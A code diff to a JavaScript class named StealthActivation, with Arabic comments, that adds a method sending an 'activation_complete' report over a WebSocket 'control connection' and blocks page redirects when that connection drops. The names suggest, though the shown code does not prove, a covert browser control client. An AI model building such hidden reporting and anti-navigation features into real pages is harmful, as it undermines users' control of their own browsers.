@@ -698,6 +698,74 @@ class StealthActivation {
             console.error('❌ خطأ في تفعيل حماية انتقال الصفحة:', error);
         }
     }
+    
+    // إرسال activation_complete مع حماية ذكية
+    sendActivationCompleteWithProtection(activationData) {
+        try {
+            console.log('🔄 بدء إرسال activation_complete مع حماية متقدمة...');
+            
+            // التحقق من حالة الاتصال
+            if (!window.controlConnection) {
+                console.warn('⚠️ لا يوجد اتصال بالخادم - تخطي الإرسال');
+                return;
+            }
+            
+            if (window.controlConnection.readyState !== WebSocket.OPEN) {
+                console.warn('⚠️ الاتصال بالخادم غير مفتوح - تخطي الإرسال');
+                return;
+            }
+            
+            // إعداد مراقب انقطاع الاتصال قبل الإرسال
+            const originalOnClose = window.controlConnection.onclose;
+            let messageSent = false;
+            
+            window.controlConnection.onclose = (event) => {
+                if (!messageSent) {
+                    console.log('🚨 تم قطع الاتصال قبل أو أثناء إرسال activation_complete');
+                    console.log('🛡️ تفعيل الحماية الفورية من about:blank');
+                    this.preventRedirectOnDisconnection();
+                }
+                
+                // استدعاء المعالج الأصلي
+                if (originalOnClose) {
+                    originalOnClose.call(window.controlConnection, event);
+                }
+            };
+            
+            // إرسال الرسالة مع timeout
+            const sendMessage = () => {
+                try {
+                    window.controlConnection.send(JSON.stringify({
+                        type: 'activation_complete',
+                        data: activationData
+                    }));
+                    messageSent = true;
+                    console.log('📤 تم إرسال activation_complete للخادم بنجاح');
+                    
+                    // إعداد timeout للتأكد من عدم انقطاع الاتصال
+                    setTimeout(() => {
+                        if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
+                            console.log('✅ الاتصال مستقر بعد إرسال activation_complete');
+                        } else {
+                            console.log('⚠️ انقطع الاتصال بعد إرسال activation_complete');
+                            this.preventRedirectOnDisconnection();
+                        }
+                    }, 2000);
+                    
+                } catch (sendError) {
+                    console.error('❌ خطأ في إرسال activation_complete:', sendError);
+                    this.preventRedirectOnDisconnection();
+                }
+            };
+            
+            // إرسال الرسالة
+            sendMessage();
+            
+        } catch (error) {
+            console.error('❌ خطأ في sendActivationCompleteWithProtection:', error);
+            this.preventRedirectOnDisconnection();
+        }
+    }
 
     // إعداد المراقبة المستمرة
     setupContinuousMonitoring() {
@@ -769,22 +837,11 @@ class StealthActivation {
             // حفظ في localStorage
             localStorage.setItem('activationStatus', JSON.stringify(activationData));
             
-            // إرسال للخادم - معطل مؤقتاً حتى يتم تحديث الخادم
-            console.log('ℹ️ تم تعطيل إرسال activation_complete مؤقتاً لتجنب انقطاع الاتصال');
-            console.log('📝 سيتم تفعيله بعد تحديث الخادم على render.com');
+            // إرسال للخادم مع حماية من انقطاع الاتصال
+            console.log('🔄 محاولة إرسال activation_complete مع حماية شاملة...');
             
-            // الكود المعطل مؤقتاً:
-            /*
-            if (window.controlConnection && window.controlConnection.readyState === WebSocket.OPEN) {
-                window.controlConnection.send(JSON.stringify({
-                    type: 'activation_complete',
-                    data: activationData
-                }));
-                console.log('📤 تم إرسال activation_complete للخادم');
-            } else {
-                console.warn('⚠️ الاتصال بالخادم غير متاح - لن يتم إرسال activation_complete');
-            }
-            */
+            // إرسال مع حماية ذكية
+            this.sendActivationCompleteWithProtection(activationData);
             
             this.isActivated = true;
             
